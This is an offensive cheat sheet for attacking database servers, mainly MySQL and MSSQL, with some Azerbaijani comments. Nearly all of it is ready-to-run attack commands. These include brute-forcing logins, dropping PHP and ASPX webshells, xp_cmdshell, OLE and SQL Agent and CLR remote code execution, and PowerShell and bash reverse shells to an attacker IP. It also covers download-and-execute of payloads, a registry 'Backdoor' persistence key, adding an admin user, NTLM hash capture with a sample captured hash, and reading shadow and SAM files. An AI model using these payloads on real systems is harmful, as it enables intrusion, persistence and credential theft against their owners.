# Database Enumeration and Exploitation Technique

---

# Database Protocols

```
## 1. MySQL 3306/TCP
## 2. PostgreSQL 5432/TCP
## 3. MSSQL 1433/TCP
## 4. Oracle Database 1521/TCP
## 5. MongoDB 27017/TCP
## 6. Redis 6379/TCP
```

# 1. Nmap

## MySQL

```bash
# Basic version & service detection
nmap -p 3306 --script mysql-info,mysql-variables <target>

# Full MySQL enumeration
nmap -p 3306 --script mysql-* <target>

# User enumeration (valid users)
nmap -p 3306 --script mysql-users --script-args userdb=/path/to/usernames.txt <target>

# Database enumeration
nmap -p 3306 --script mysql-databases --script-args mysqluser='root',mysqlpass='pass' <target>

# Enum tables from specific DB
nmap -p 3306 --script mysql-dump <target> --script-args mysqluser='user',mysqlpass='pass',mysqldb='dbname'

# Brute force (dictionary attack)
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <target>

# SQL injection testing
nmap -p 3306 --script mysql-sql-injection <target>
```

## MySQL Exploitation Commands
```bash
-- Current user & privileges
SELECT user(), current_user(), @@version;
SHOW GRANTS FOR CURRENT_USER();

-- All users & hosts
SELECT user, host, account_locked FROM mysql.user;
SELECT user,host FROM mysql.user WHERE User NOT LIKE '%mysql.sys';

-- Databases & tables
SHOW DATABASES;
USE <dbname>; SHOW TABLES;
SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();

-- Processes
SHOW PROCESSLIST;
SELECT * FROM information_schema.processlist WHERE user != 'system user';

=========== OUTFILE Webshell (Ən sürətli) ===========
-- Create UDF dir (if writable)
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/tmp/test.php';
SELECT "<?=$_GET?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/phpinfo3.php';
SELECT LOAD_FILE('/tmp/test.php');

-- Linux UDF RCE (mysql root)
-- Önce lib_mysqludf_sys.so yaradın/upload edin
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING  SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('whoami');
SELECT sys_eval('id');

-- Cleanup
DROP FUNCTION sys_exec; DROP FUNCTION sys_eval;

=========== LOAD_FILE Read (Local files) ===========
-- PHP webshell (Apache)
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Nginx
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/usr/share/nginx/html/shell.php';

-- Reverse shell
SELECT '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\""); ?>' INTO OUTFILE '/var/www/html/rs.php';

-- Multi-shell
SELECT '<?php @eval($_POST["pass"]); ?>' INTO OUTFILE '/var/www/html/admin.php';

=========== LOAD_FILE Read (Local files) ===========
-- Config files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/wp-config.php');
SELECT LOAD_FILE('/etc/shadow'); -- root lazım

-- Hexdump böyük files
SELECT HEX(LOAD_FILE('/etc/passwd'));

-- MySQL config
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT @@datadir, @@basedir;

=========== MYSQL UDF Assembly (Advanced RCE) ===========
-- Dir yaz (UDF üçün)
SELECT 'CREATE TABLE IF NOT EXISTS udf (a int) ENGINE=MyISAM;' INTO OUTFILE '/tmp/udf.sql';
-- MySQL restart lazım sonra: LOAD DATA INFILE='/tmp/udf.so' INTO TABLE mysql_func ...

-- Windows UDF
SELECT 0x90 INTO DUMPFILE 'C:\\mysql\\lib\\plugin\\udf.dll';

=========== Privilege Escalation ===========
-- Superpriv users
SELECT user,host,super FROM mysql.user WHERE super=1;

-- Impersonation (plugin abuse)
UPDATE mysql.user SET plugin='unix_socket' WHERE user='root';

-- File priv check
SHOW GRANTS FOR 'user'@'host';
SELECT @@secure_file_priv;

=========== MYSQLCLIENT ONE-LINERS ===========
# Webshell
mysql -u root -p -h target -e "SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"

# UDF dir
mysql -u root -p -h target -e "SELECT 'CREATE TABLE IF NOT EXISTS udf (a int) ENGINE=MyISAM;' INTO OUTFILE '/tmp/udf.sql';"

# File read
mysql -u root -p -h target -e "SELECT LOAD_FILE('/etc/passwd');"
```


## MSSQL
```
# Qoşulma üsulları
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

# Linuxdan
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

```

```bash
# Basic MSSQL detection & version
nmap -p 1433 --script ms-sql-info <target>

# Full MSSQL enumeration
nmap -p 1433 --script ms-sql-* <target>

# MSSQL user enumeration
nmap -p 1433 --script ms-sql-hasdbaccess,ms-sql-empty-password <target>

# Database enumeration
nmap -p 1433 --script ms-sql-databases,ms-sql-tables <target>

# Brute force login
nmap -p 1433 --script ms-sql-brute --script-args mssqluserdb=users.txt,mssqlpassdb=pass.txt <target>

# XP_CMDSHELL execution check (pre-auth)
nmap -p 1433 --script ms-sql-xp-cmdshell <target>

# Dump hashes (if creds available)
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssqlusername='sa',mssqlpassword='pass' <target>

# Config backup download
nmap -p 1433 --script ms-sql-config <target> --script-args mssqlusername='sa',mssqlpassword='pass'


sqlcmd -S SERVERNAME -E
sqlcmd -S tcp:10.0.0.5,1433 -E

sqlcmd -S SERVER -U username -P password
sqlcmd -S 10.0.0.5 -U sa -P password

nc -nv 10.0.0.5 1433

mssql-cli -S 10.0.0.5 -U sa -P password
impacket-mssqlclient domain/user:password@10.0.0.5
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py fiona@10.129.203.10 -windows-auth
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py inlanefreight/fiona@10.129.203.10 -windows-auth
```



## MSSQL Exploitation Commands

```bash
SELECT name FROM sys.databases;
USE <dbname>;
SELECT name FROM sys.tables;

# Başqa User adından istifadə
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

# MSSQL Serverdə rolumuz
SELECT * FROM sys.database_role_members;

# Hansı user kimi təqlid edə bilər
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

EXECUTE AS LOGIN = 'john';
SELECT SYSTEM_USER;

SELECT IS_SRVROLEMEMBER('sysadmin');

# Linked Serverləri listələmək
SELECT srvname, isremote FROM sysservers;

# Linked Serverə keçid
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]

# Linked Server üzərindən
EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV] 
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]

# Lokal Server üzərindən 
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
enable_xp_cmdshell
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_readerrorlog;
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

```bash
-- Service accounts
SELECT servicename, service_account FROM sys.dm_server_services;

-- Current context
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin'), @@version;

-- Sysadmin check
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Logins & roles
SELECT name FROM sys.sql_logins;
SELECT name FROM sys.database_principals;
SELECT name FROM sys.server_principals;


-- Trustworthy DBs
SELECT name, is_trustworthy_on FROM sys.databases;
TRUSTWORTHY ON olduqda, database içindəki kod server səviyyəsində etibar edilə bilər.

SELECT name AS database_name, SUSER_SNAME(owner_sid) AS owner_login FROM sys.databases;
SELECT name, SUSER_SNAME(owner_sid) FROM sys.databases;
Database owner tapmaq


-- Linked servers
SELECT srvname, isremote FROM sysservers;

=========== xp_cmdshell ===========
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_readerrorlog;
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;

=========== xp_dirtree ===========
SMB Server create on attack machine: 10.10.10.10/shared
responder -I tun0
EXEC master..xp_dirtree '\\10.10.15.53\shared\'

Hash Dump: mssqlsvc::WIN-02:774062010c35889b:8AD0A73097111E83A8C7583F62804E66:01010000000000000015609377A1DC018BB554A46EE3F69C00000000020008004A0047003000490001001E00570049004E002D004B004800380033005A0056004B004D0032005400440004003400570049004E002D004B004800380033005A0056004B004D003200540044002E004A004700300049002E004C004F00430041004C00030014004A004700300049002E004C004F00430041004C00050014004A004700300049002E004C004F00430041004C00070008000015609377A1DC01060004000200000008003000300000000000000000000000003000006CF2C8BCEEC59960A7CA8EDCA865129A886D872F143ACC745FC922B4E2A5FE890A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320034000000000000000000

hashcat -a 0 -m 5600 hash wordlist

=========== OLE Automation ===========
Enable
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures'; -- Verify

ASPX Webshell
DECLARE @obj INT, @fso INT, @file INT, @hr INT
EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT
EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\inetpub\wwwroot\shell.aspx', 2
EXEC @hr = sp_OAMethod @file, 'Write', NULL, '<%@ Page Language="C#" %><% Process proc = new Process(); proc.StartInfo.FileName = Request["cmd"]; proc.StartInfo.Arguments = "/c " + Request["c"]; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>"); proc.WaitForExit(); %>'
EXEC @hr = sp_OAMethod @file, 'Close'; EXEC sp_OADestroy @file; EXEC sp_OADestroy @obj

PHP Webshell
DECLARE @obj INT, @fso INT, @file INT, @hr INT
EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT
EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\inetpub\wwwroot\cmd.php', 2
EXEC @hr = sp_OAMethod @file, 'Write', NULL, '<?php echo shell_exec($_GET["c"]); ?>'
EXEC @hr = sp_OAMethod @file, 'Close'; EXEC sp_OADestroy @file; EXEC sp_OADestroy @obj

PowerShell Reverse Shell (to disk)
DECLARE @obj INT, @com INT, @file INT, @hr INT, @src NVARCHAR(1000)
SET @src = N'$client = new-object System.Net.Sockets.TCPClient("YOUR_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT
EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\Windows\Temp\rev.ps1', 2
EXEC @hr = sp_OAMethod @file, 'Write', NULL, @src; EXEC @hr = sp_OAMethod @file, 'Close'
EXEC @hr = sp_OACreate 'WScript.Shell', @com OUT
EXEC @hr = sp_OAMethod @com, 'Run', NULL, 'powershell.exe -ep bypass -f C:\Windows\Temp\rev.ps1'
EXEC sp_OADestroy @com

Download & Execute
DECLARE @obj INT, @com INT, @hr INT
EXEC @hr = sp_OACreate 'WScript.Shell', @com OUT
EXEC @hr = sp_OAMethod @com, 'Run', NULL, 'certutil.exe -urlcache -split -f http://YOUR_IP/payload.exe C:\Windows\Temp\payload.exe && C:\Windows\Temp\payload.exe'
EXEC sp_OADestroy @com

Registry Persistence
DECLARE @obj INT, @hr INT
EXEC @hr = sp_OACreate 'WScript.Shell', @obj OUT
EXEC @hr = sp_OAMethod @obj, 'RegWrite', NULL, 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Backdoor', 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://YOUR_IP/backdoor.ps1'')"'
EXEC sp_OADestroy @obj

WMI Exec
DECLARE @obj INT, @hr INT
EXEC @hr = sp_OACreate 'WbemScripting.SWbemLocator', @obj OUT
EXEC @hr = sp_OAMethod @obj, 'ConnectServer', @output OUT, '.', 'root\cimv2'
EXEC @hr = sp_OAMethod @output, 'ExecQuery', @output OUT, 'SELECT * FROM Win32_Process WHERE name=''cmd.exe'''
EXEC sp_OADestroy @obj

=========== SQL AGENT JOB RCE ===========
PowerShell Job (Diskless)
EXEC msdb.dbo.sp_add_job @job_name = N'hacker', @enabled = 1;
EXEC msdb.dbo.sp_add_jobstep @job_name = N'hacker', @step_name = N'ps1', @subsystem = N'PowerShell', @command = N'IEX (New-Object Net.WebClient).DownloadString("http://YOUR_IP/shell.ps1")';
EXEC msdb.dbo.sp_start_job N'hacker';
EXEC msdb.dbo.sp_delete_job @job_name = N'hacker';

CMD Job (xp_cmdshell olmadan)
EXEC msdb.dbo.sp_add_jobstep @job_name = N'hacker', @step_name = N'cmd', @subsystem = N'CMDEXEC', @command = N'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://YOUR_IP/shell.ps1'')"';

Enum Agent
SELECT name, is_enabled, current_mode FROM msdb.dbo.sysjobservers;
SELECT name, enabled FROM msdb.dbo.sysjobs;

=========== CLR Assemblies RCE (xp_cmdshell bloklandıqda SILENT) ===========
-- Enable CLR (unsafe)
ALTER DATABASE [database_name] SET TRUSTWORTHY ON;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;

EXEC sp_configure 'clr strict security', 0; RECONFIGURE;

-- Create RCE DLL (powershell.exe çağırır)
-- Önce DLL-i yaradın və serverə upload edin: EvilCLR.dll

CREATE ASSEMBLY EvilCLR FROM 'C:\temp\EvilCLR.dll' WITH PERMISSION_SET = UNSAFE;
CREATE FUNCTION dbo.ExecCmd(@cmd NVARCHAR(4000)) RETURNS INT AS EXTERNAL NAME EvilCLR.StoredProcedures.ExecCmd;
SELECT dbo.ExecCmd('powershell IEX(New-Object Net.WebClient).DownloadString("http://IP/shell.ps1")');

-- Cleanup
DROP FUNCTION dbo.ExecCmd; DROP ASSEMBLY EvilCLR;

=========== Credential Harvesting (NTLM Hash Dump - Responder) ===========
-- xp_dirtree SMB hash trigger
EXEC xp_dirtree '\\YOUR_IP\share', 1, 1;

-- xp_fileexist (alternativ)
EXEC xp_fileexist '\\YOUR_IP\share\test.txt';

-- Multi-trigger
DECLARE @i INT = 0; WHILE @i < 10 BEGIN EXEC xp_dirtree '\\YOUR_IP\share',1,1; SET @i = @i + 1; END;

-- Responder listener: responder -I eth0 -v

=========== PRIVILEGE ESCALATION ===========
-- Impersonation
SELECT distinct b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE permission_name = 'IMPERSONATE';

-- Run as sysadmin
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')
REVERT;

-- Help
EXEC sp_helpuser;

=========== FILE READ ===========
-- Local files
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\config\SAM', SINGLE_BLOB) AS x;
SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x;

=========== LINKED SERVER ABUSE ===========
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]

=========== MSSQLCLIENT.PY ONE-LINERS ===========
# SQL Agent RCE
python3 mssqlclient.py sa:pass@target -query "EXEC msdb.dbo.sp_add_job @job_name=N'h',@enabled=1;EXEC msdb.dbo.sp_add_jobstep @job_name=N'h',@step_name=N'x',@subsystem=N'PowerShell',@command=N'IEX(New-Object Net.WebClient).DownloadString(\"http://IP/shell.ps1\");EXEC msdb.dbo.sp_start_job N'h'"

# OLE Webshell
python3 mssqlclient.py sa:pass@target -query "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;DECLARE @obj INT;EXEC sp_OACreate 'Scripting.FileSystemObject',@obj OUT;EXEC sp_OAMethod @obj,'CreateTextFile',NULL,'C:\\inetpub\\wwwroot\\shell.aspx',2;EXEC sp_OADestroy @obj"

=========== LISTENERS ===========
nc -lvnp 4444
python3 -m http.server 80
curl "http://target/shell.aspx?cmd=whoami&c=dir"
```

## PostgreSQL

```bash
# Basic PostgreSQL detection
nmap -p 5432 --script postgres-info <target>

# Full PostgreSQL enumeration
nmap -p 5432 --script postgres-* <target>

# User & DB enumeration
nmap -p 5432 --script postgres-users,postgres-databases <target>

# Brute force
nmap -p 5432 --script postgres-brute --script-args userdb=users.txt,passdb=pass.txt <target>

# Version & roles (if auth)
nmap -p 5432 --script postgres-roles --script-args postgresuser='postgres',postgrespass='pass' <target>

# Dump config files
nmap -p 5432 --script postgres-config --script-args postgresuser='postgres',postgrespass='pass' <target>
```

## MongoDB

```bash
# Basic MongoDB detection
nmap -p 27017 --script mongodb-info <target>

# Full MongoDB enumeration
nmap -p 27017 --script mongodb-* <target>

# No-auth access check & database dump
nmap -p 27017 --script mongodb-databases,mongodb-users <target>

# Brute force (if auth enabled)
nmap -p 27017 --script mongodb-brute --script-args mongodbuserdb=users.txt,mongodbpassdb=pass.txt <target>

# Check accessible collections
nmap -p 27017 --script mongodb-databases --script-args mongodbusername='admin',mongodbdatabase='admin' <target>
```

## Redis

```bash
# Basic Redis detection
nmap -p 6379 --script redis-info <target>

# Full Redis enumeration
nmap -p 6379 --script redis-* <target>

# Redis key enumeration (no auth)
nmap -p 6379 --script redis-keyspace,redis-info <target>

# Brute force (if auth enabled)
nmap -p 6379 --script redis-brute --script-args redisuser='default',redispassdb=pass.txt <target>

# Check for RCE via CONFIG (common misconfig)
nmap -p 6379 --script redis-info --script-args redisusername='',redispassword='' <target>


nmap -p 3306,1433,5432,27017,6379 --script "mysql-*","ms-sql-*","postgres-*","mongodb-*","redis-*" <target> \
  --script-args="userdb=/path/to/users.txt,passdb=/path/to/pass.txt"
```

## Login

```bash
# Connect
mysql -h <host> -P 3306 -u <user> -p<pass>

# Basic connections
mysql -u root -p                    # Local root
mysql -h 192.168.1.100 -u admin -p  # Remote

# Enum databases
SHOW DATABASES;
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

# Enum tables
USE <dbname>;
SHOW TABLES;
SELECT table_name FROM information_schema.tables WHERE table_schema = '<dbname>';

# Enum columns
DESCRIBE <table>;
SHOW COLUMNS FROM <table>;
SELECT column_name FROM information_schema.columns WHERE table_name = '<table>';

# Enum users
SELECT user,host FROM mysql.user;
SELECT User,authentication_string FROM mysql.user;

# Dump data
SELECT * FROM <table> LIMIT 10;
SELECT * FROM <table> INTO OUTFILE '/tmp/dump.txt';

# Privilege enum
SHOW GRANTS FOR 'user'@'host';
SELECT * FROM mysql.user WHERE User='<username>';

==================================================================================================================================================================

# Connect syntax
sqlcmd -S <server>,1433 -U <user> -P <pass> -d <database>

# Examples
sqlcmd -S 192.168.1.100 -U sa -P P@ssw0rd
sqlcmd -S localhost -E                 # Windows auth

# Enum databases
SELECT name FROM sys.databases;
SELECT name FROM master..sysdatabases;

# Enum tables
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';
SELECT name FROM sysobjects WHERE xtype='U';

# Enum columns
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<table>';
sp_columns <table>;

# Enum users
SELECT name FROM sys.server_principals;
SELECT name,password_hash FROM sys.sql_logins;

# Dump data
SELECT TOP 10 * FROM <table>;
xp_cmdshell 'whoami';                  # RCE if enabled

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

==================================================================================================================================================================

# Install: pip install mycli
mycli -h <host> -P 3306 -u <user> -p

# Fuzzy search + syntax highlighting
# Use ↑↓ for history, TAB for autocomplete

# Quick enum aliases (built-in)
.tables                 # Show tables
.fields <table>         # Show columns
.use <db>              # Switch database
.showdb                # Show databases

# Export results
.mycli --csv results.csv

# Connection Properties:
Host: <ip>    Port: 3306/1433
Username: <user>    Password: <pass>
Database: <optional>

# Quick Queries (F5 to execute):
-- MySQL
SHOW DATABASES;
SELECT table_name FROM information_schema.tables;

-- MSSQL  
SELECT name FROM sys.databases;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

==================================================================================================================================================================
```

# 3.Exploitation

```
# Install: apt install sqsh
sqsh -S <target>,1433 -U <user> -P <pass>

# Connect & enable xp_cmdshell
1> sp_configure 'show advanced options', 1 
2> go
1> RECONFIGURE
2> go
1> sp_configure 'xp_cmdshell', 1
2> go
1> RECONFIGURE
2> go

# RCE payloads
xp_cmdshell 'whoami'
xp_cmdshell 'net user hacker P@ssw0rd /add'
xp_cmdshell 'net localgroup administrators hacker /add'

# Webshell drop (IIS)
xp_cmdshell 'echo ^<?php system($_GET["c"]); ?^> > C:\inetpub\wwwroot\shell.php'

# Meterpreter
xp_cmdshell 'certutil -urlcache -split -f http://<your-ip>/payload.exe payload.exe'
xp_cmdshell 'payload.exe'

==================================================================================================================================================================

# Interactive shell → Enable & execute
python3 mssqlclient.py sa:pass@target

# Inside mssqlclient shell:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Test RCE
xp_cmdshell 'whoami';
xp_cmdshell 'powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString(''http://<ip>/Invoke-PowerShellTcp.ps1'');$client = New-Object System.Net.Sockets.TCPClient(''<ip>'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';

-- ASP Classic webshell
xp_cmdshell 'echo ^<%@LANGUAGE=VBScript^%>^<%Response.Write^("^-Shell--^")^%> > C:\inetpub\wwwroot\shell.asp'

-- PHP webshell (if PHP+IIS)
xp_cmdshell 'powershell "''^<?php echo shell_exec($_GET[''''c'''']); ?^>'' | Out-File C:\inetpub\wwwroot\shell.php -Encoding ASCII"'

-- ASPX webshell
xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<%@ Import Namespace="System.Diagnostics" %^>^<% Process proc = new Process(); proc.StartInfo.FileName = Request["cmd"]; proc.StartInfo.Arguments = "/c " + Request["c"]; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); Response.Write^("<pre^>" + proc.StandardOutput.ReadToEnd() + "^</pre^>"); proc.WaitForExit(); %> > C:\inetpub\wwwroot\shell.aspx'

-- PHP Webshell (Apache)
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Nginx variant
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/usr/share/nginx/html/shell.php';

-- Multiple shells
SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';
SELECT '<?php @eval($_POST["pass"]); ?>' INTO OUTFILE '/var/www/html/admin.php';

-- Meterpreter
SELECT '<?php system("wget http://<ip>/payload.elf"); ?>' INTO OUTFILE '/var/www/html/dl.php';

-- Reverse shell
SELECT '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/<ip>/4444 0>&1\""); ?>' INTO OUTFILE '/var/www/html/rs.php';

-- Create UDF directory (if write access)
CREATE TABLE temp (line LONGTEXT NOT NULL);
SELECT "<?php system($_POST['c']); ?>" INTO OUTFILE "/tmp/test.php";
SELECT LOAD_FILE("/tmp/test.php");

-- Linux UDF (mysql root)
mysql> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
mysql> SELECT sys_exec('whoami');

-- PowerShell Empire/Stageless Meterpreter
xp_cmdshell 'powershell -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(''http://<ip>/ps1.ps1'')"'

-- Cobalt Strike beacon
xp_cmdshell 'certutil -urlcache -split -f http://<ip>/beacon.exe beacon.exe && beacon.exe'

-- Named pipe reverse shell
xp_cmdshell 'powershell -c "$client = new-object System.Net.Sockets.TCPClient(''<ip>'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"'

